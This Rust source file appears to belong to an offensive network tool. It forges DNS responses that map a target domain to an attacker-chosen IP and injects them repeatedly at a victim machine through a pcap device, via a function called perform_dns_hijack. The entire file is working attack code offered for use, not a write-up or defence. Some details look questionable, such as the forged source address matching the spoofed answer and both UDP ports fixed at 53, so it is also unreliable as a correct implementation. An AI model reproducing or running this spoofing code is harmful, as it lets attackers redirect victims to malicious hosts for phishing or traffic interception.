use std::error::Error;
use std::net::Ipv4Addr;

use crate::utils::{MacAddr, ipv4_to_bytes, send_packet};
use pcap::Device;

fn checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut chunks = data.chunks_exact(2);
    for chunk in &mut chunks {
        let word = u16::from_be_bytes([chunk[0], chunk[1]]) as u32;
        sum = sum.wrapping_add(word);
    }

    if let Some(&rem) = chunks.remainder().first() {
        sum = sum.wrapping_add((rem as u32) << 8);
    }

    while (sum >> 16) != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    !(sum as u16)
}

fn build_dns_response(
    attacker_mac: MacAddr,
    target_mac: MacAddr,
    victim_ip: Ipv4Addr,
    spoofed_ip: Ipv4Addr,
    domain: &str,
    ttl: u32,
    transaction_id: u16,
) -> Vec<u8> {
    let mut packet = Vec::new();

    // Ethernet header
    packet.extend_from_slice(&target_mac.0);
    packet.extend_from_slice(&attacker_mac.0);
    packet.extend_from_slice(&0x0800u16.to_be_bytes());

    // Placeholder IP header (20 bytes)
    let src_ip = ipv4_to_bytes(spoofed_ip);
    let dst_ip = ipv4_to_bytes(victim_ip);

    let mut ip_header = vec![0u8; 20];
    ip_header[0] = 0x45; // version + IHL
    ip_header[1] = 0; // DSCP/ECN
    // length set later
    ip_header[6] = 0x40; // flags + fragment offset
    ip_header[8] = 64; // TTL
    ip_header[9] = 17; // protocol UDP
    ip_header[12..16].copy_from_slice(&src_ip);
    ip_header[16..20].copy_from_slice(&dst_ip);

    // DNS payload
    let mut dns_payload = Vec::new();
    dns_payload.extend_from_slice(&transaction_id.to_be_bytes());
    dns_payload.extend_from_slice(&0x8180u16.to_be_bytes()); // flags
    dns_payload.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    dns_payload.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
    dns_payload.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
    dns_payload.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT

    for part in domain.split('.') {
        dns_payload.push(part.len() as u8);
        dns_payload.extend_from_slice(part.as_bytes());
    }
    dns_payload.push(0); // terminator
    dns_payload.extend_from_slice(&1u16.to_be_bytes()); // QTYPE A
    dns_payload.extend_from_slice(&1u16.to_be_bytes()); // QCLASS IN

    // Answer
    dns_payload.extend_from_slice(&0xC00Cu16.to_be_bytes()); // pointer to name
    dns_payload.extend_from_slice(&1u16.to_be_bytes());
    dns_payload.extend_from_slice(&1u16.to_be_bytes());
    dns_payload.extend_from_slice(&ttl.to_be_bytes());
    dns_payload.extend_from_slice(&4u16.to_be_bytes());
    dns_payload.extend_from_slice(&ipv4_to_bytes(spoofed_ip));

    // UDP header
    let udp_len = 8 + dns_payload.len();
    let mut udp_header = vec![0u8; 8];
    udp_header[0..2].copy_from_slice(&53u16.to_be_bytes()); // src port
    udp_header[2..4].copy_from_slice(&53u16.to_be_bytes()); // dst port
    udp_header[4..6].copy_from_slice(&(udp_len as u16).to_be_bytes());

    // UDP checksum with pseudo header
    let mut pseudo_header = Vec::new();
    pseudo_header.extend_from_slice(&src_ip);
    pseudo_header.extend_from_slice(&dst_ip);
    pseudo_header.push(0);
    pseudo_header.push(17); // UDP
    pseudo_header.extend_from_slice(&(udp_len as u16).to_be_bytes());

    let mut checksum_data = pseudo_header.clone();
    checksum_data.extend_from_slice(&udp_header);
    checksum_data.extend_from_slice(&dns_payload);
    let udp_checksum = checksum(&checksum_data);
    udp_header[6..8].copy_from_slice(&udp_checksum.to_be_bytes());

    // Final lengths and checksums for IP header
    let total_len = (ip_header.len() + udp_len) as u16;
    ip_header[2..4].copy_from_slice(&total_len.to_be_bytes());
    let ip_checksum = checksum(&ip_header);
    ip_header[10..12].copy_from_slice(&ip_checksum.to_be_bytes());

    packet.extend_from_slice(&ip_header);
    packet.extend_from_slice(&udp_header);
    packet.extend_from_slice(&dns_payload);

    packet
}

pub fn perform_dns_hijack(
    device: &Device,
    attacker_mac: MacAddr,
    victim_mac: MacAddr,
    victim_ip: Ipv4Addr,
    spoof_ip: Ipv4Addr,
    domain: &str,
    ttl: u32,
    transaction_id: u16,
    repeat: u16,
) -> Result<(), Box<dyn Error>> {
    let packet = build_dns_response(
        attacker_mac,
        victim_mac,
        victim_ip,
        spoof_ip,
        domain,
        ttl,
        transaction_id,
    );

    for _ in 0..repeat {
        send_packet(device, &packet)?;
    }

    Ok(())
}
